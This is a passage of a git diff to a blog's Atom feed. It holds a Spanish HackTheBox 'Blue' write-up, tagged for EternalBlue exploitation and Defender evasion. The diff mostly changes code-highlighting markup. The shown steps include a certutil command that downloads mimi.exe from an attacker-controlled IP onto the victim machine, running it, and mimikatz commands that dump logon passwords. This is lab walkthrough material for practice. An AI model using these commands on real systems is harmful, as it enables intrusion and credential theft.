-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;homepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;computername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;homepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Y así para cada una una de las variables de entorno, recordemos que si una no la reporta no la ponemos para evitar problemas, también cuando mas variables de entorno coloquemos mejor, pero no necesitamos colocarlas todas.&lt;/p&gt;
@@ -1198,7 +1198,7 @@ payload_type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; EXE
 
 &lt;p&gt;Ahora nos descargamos el archivo desde la maquina victima haciendo uso de certutil&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;certutil.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-split&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://10.10.14.9/mimi.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;certutil.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-split&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://10.10.14.9/mimi.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/download_file.png&quot; alt=&quot;download file.png&quot; /&gt;&lt;/p&gt;
@@ -1207,7 +1207,7 @@ payload_type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; EXE
 
 &lt;p&gt;Ahora a ejecutar nuestro archivo&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;mimi.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mimi.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/mimikatz.png&quot; alt=&quot;mimikatz.png&quot; /&gt;&lt;/p&gt;
@@ -1216,8 +1216,8 @@ payload_type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; EXE
 
 &lt;p&gt;Lo hacemos de la siguiente manera&lt;/p&gt;
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;privilege::debug&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sekurlsa::logonPasswords&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;privilege::debug&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sekurlsa::logonPasswords&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Si todo sale bien nos mostrara la credencial&lt;/p&gt;
@@ -1228,4 +1228,4 @@ payload_type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; EXE
 
 &lt;p&gt;Listo con esto tendríamos varias maneras y caminos los cuales nos servirán mucho para otras máquinas, recuerden que la practica hace al maestro.&lt;/p&gt;
 
-&lt;p&gt;Les dejo la resolución de la misma por s4vitar &lt;a href=&quot;https://www.youtube.com/watch?v=92XycxcAXkI&quot;&gt;Ver video&lt;/a&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="SMB Enumeration" /><category term="Eternalblue Exploitation(MS17-010)" /><category term="Persistence" /><category term="Windows Defender Evasion" /><summary type="html">Blue es una maquina donde estaremos explotando la famosa vulnerabilidad eternalblue MS17-010 pero manualmente haciendo uso de un exploit en github, luego de comprometer la maquina, practicaremos técnicas de evasión de defender y un par de cosas más.</summary></entry></feed>
+&lt;p&gt;Les dejo la resolución de la misma por s4vitar &lt;a href=&quot;https://www.youtube.com/watch?v=92XycxcAXkI&quot;&gt;Ver video&lt;/a&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="hackthebox" /><category term="OSCP" /><category term="Fácil" /><category term="Windows" /><category term="SMB Enumeration" /><category term="Eternalblue Exploitation(MS17-010)" /><category term="Persistence" /><category term="Windows Defender Evasion" /><summary type="html">Blue es una maquina donde estaremos explotando la famosa vulnerabilidad eternalblue MS17-010 pero manualmente haciendo uso de un exploit en github, luego de comprometer la maquina, practicaremos técnicas de evasión de defender y un par de cosas más.</summary></entry></feed>
